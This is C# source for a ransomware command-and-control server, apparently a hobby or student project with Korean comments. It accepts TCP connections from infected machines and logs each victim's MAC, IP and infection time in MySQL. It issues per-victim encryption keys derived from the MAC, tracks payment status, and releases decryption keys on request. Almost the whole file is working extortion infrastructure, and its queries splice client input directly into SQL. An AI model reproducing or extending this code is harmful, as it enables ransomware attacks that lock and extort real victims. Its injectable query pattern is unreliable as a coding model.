using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Drawing.Imaging;
using MySql.Data.MySqlClient;
using System.Security.Cryptography;
using System.Collections;

namespace SocketRansomwareServer
{
    public partial class Form1 : Form
    {
        
        public Form1()
        {
            InitializeComponent();
            DB.Instance.CreateConnection();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            Thread thr = new Thread(Accept); //쓰레드생성
            thr.IsBackground = true; //데몬쓰레드 선언
            thr.Start(); //시작
            button1.Enabled = false; //버튼끄기
        }

        public void Accept()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 8080); //서버클래스
            listener.Start(); //서버시작
            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                clients cList = new clients(); //클라이언트 데이터반환 쓰레드
                cList.Set(client, listView1); //설정+시작
            }
        }

        class clients
        {
            private List<ClientVO> clientList = new List<ClientVO>();
            TcpClient tcp; //해당쓰레드에서 담당할 클라이언트 객체
            ListView listView; //리스트박스를 다른클래스에서 조정하기위해 만든 listBox
            string _mac = null;
            public void Set(TcpClient tcp, ListView listView)
            {
                this.tcp = tcp;
                this.listView = listView;
                Thread thr = new Thread(Run);
                thr.IsBackground = true;
                thr.Start();
            }
            public void Run()
            {
                byte[] bytes = new byte[1024];
                while (true)
                {
                    try
                    {
                        for (int i = 0; i < 1024; i++) bytes[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
                        NetworkStream net = tcp.GetStream();//네트워크스트림(소켓상에 데이터가 존재하는곳)
                        net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
                        string str = Encoding.Default.GetString(bytes).Trim('\0');
                        string[] request = str.Split(';');
                        if (request[0] == "mac") CheckDB(request[1]);
                        else if (request[0] == "decrypt") SendDecryptKey(request[1]);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                        break;
                    }

                }
            }
            //접속한 클라이언트가 최초 실행인지 확인
            private void CheckDB(string mac)
            {
                _mac = mac;
                try
                {
                    //  using (DB.Instance._connection)
                    //  {
                    string query = string.Format("select * from client where mac = '{0}'", mac);
                    MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
                    MySqlDataReader table = command.ExecuteReader();

                    if (table.HasRows)
                    {
                        table.Read();
                        //Console.WriteLine($"이미 존재, {table.GetString("start_date")}");
                        string start_date = table.GetDateTime("start_date").ToString("yyyy-MM-dd HH:mm:ss");
                        SendDataClient("timestamp;infection;" + start_date + ";current;" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                 
                        table.Close();
                        getClientsDB();

                    }
                    else
                    {
                        table.Close();
                        Console.WriteLine("최초 실행");
                        Socket c = tcp.Client;
                        IPEndPoint ip_point = (IPEndPoint)c.RemoteEndPoint;
                        string ip = ip_point.Address.ToString();
                        string start_date = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                        SHA256Managed sha = new SHA256Managed();
                        byte[] encryptByte = sha.ComputeHash(Encoding.UTF8.GetBytes(mac));
                        //base64
                        string key = Convert.ToBase64String(encryptByte);

                        string insertQuery = $"insert into client(mac,ip,start_date,`key`) values('{mac}','{ip}','{start_date}','{key}')";
                        Console.WriteLine(key);
                        command = new MySqlCommand(insertQuery, DB.Instance._connection);

                        

                        if (command.ExecuteNonQuery() == 1)
                        {
                            Console.WriteLine("DB 저장 성공");
                            SendDataClient("encrypt;" + key);
                            SendDataClient("timestamp;infection;" + start_date + ";current;" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                            getClientsDB();
                        }
                        else Console.WriteLine("DB 저장 실패");
                        // }

                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }

            private void getClientsDB()
            {
                clientList.Clear();
                string query = string.Format("select * from client");
                MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
                MySqlDataReader table = command.ExecuteReader();

                if(table.HasRows)
                {
                    while(table.Read())
                    {
                        ClientVO vo = new ClientVO();
                        vo.setMac(table.GetString("mac"));
                        vo.setIp(table.GetString("ip"));
                        vo.setInfectionTime(table.GetString("start_date"));
                        vo.setIsPayment(table.GetBoolean("is_payment"));

                        clientList.Add(vo);
                    }
                }
                table.Close();

                UpdateListViewSafe();
                
            }

            private void GetInfectionTime()
            {
                using (DB.Instance._connection)
                {
                    string query = $"select start_date from client where mac = {_mac}";
                    MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
                    MySqlDataReader table = command.ExecuteReader();

                    while (table.Read())
                    {
                        Console.WriteLine($"{table["start_date"]}");
                    }

                }

            }

            private void SendDecryptKey(string mac)
            {
                string query = string.Format("select `key` from client where mac = '{0}'", mac);
                MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
                MySqlDataReader table = command.ExecuteReader();

                if(table.HasRows)
                {
                    table.Read();
                    string key = "key;" + table.GetString(0);
                    SendDataClient(key);
                }
                table.Close();

                //is_payment true로 업데이트
                query = string.Format("update client set is_payment=1 where mac = '{0}'", mac);
                command = new MySqlCommand(query, DB.Instance._connection);

                if (command.ExecuteNonQuery() == 1)
                {
                    Console.WriteLine("DB 저장 성공");
                    getClientsDB();
                }
                else Console.WriteLine("DB 저장 실패");
            }

            //클라이언트로 데이터 전송
            private void SendDataClient(string str)
            {
                try
                {
                    byte[] buffer = new byte[1024];
                    NetworkStream net;
                    for (int i = 0; i < 1024; i++) buffer[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
                    buffer = Encoding.Default.GetBytes(str);
                    net = tcp.GetStream(); //네트워크스트림 얻어오기
                    net.Write(buffer, 0, buffer.Length);
                    net.Flush();
                }
                catch (Exception e)
                {
                    Console.WriteLine($"전송 실패 : {e.Message}");
                }


            }
            private void UpdateListViewSafe()
            { 
                if (listView.InvokeRequired)
                {
                    listView.BeginInvoke(
                        (System.Action)(() =>
                        {
                            listView.BeginUpdate();
                            listView.Items.Clear();
                            if (clientList.Count != 0)
                            {
                                foreach (ClientVO vo in clientList)
                                {
                                    ListViewItem lvi = new ListViewItem(vo.getMac());
                                    lvi.SubItems.Add(vo.getIp());
                                    lvi.SubItems.Add(vo.getInfectionTime());
                                    lvi.SubItems.Add(vo.getIsPayment().ToString());
                                    //listView.Items.Add(text); //표시
                                    listView.Items.Add(lvi);
                                }
                            }
                            listView.EndUpdate();
                        }));

                }
                else
                {
                    listView.BeginUpdate();
                    listView.Items.Clear();
                    if (clientList.Count != 0)
                    {
                        foreach (ClientVO vo in clientList)
                        {
                            ListViewItem lvi = new ListViewItem(vo.getMac());
                            lvi.SubItems.Add(vo.getIp());
                            lvi.SubItems.Add(vo.getInfectionTime());
                            lvi.SubItems.Add(vo.getIsPayment().ToString());
                            //listView.Items.Add(text); //표시
                            listView.Items.Add(lvi);
                        }
                    }
                    listView.EndUpdate();
                }
            }
        }


    }
}
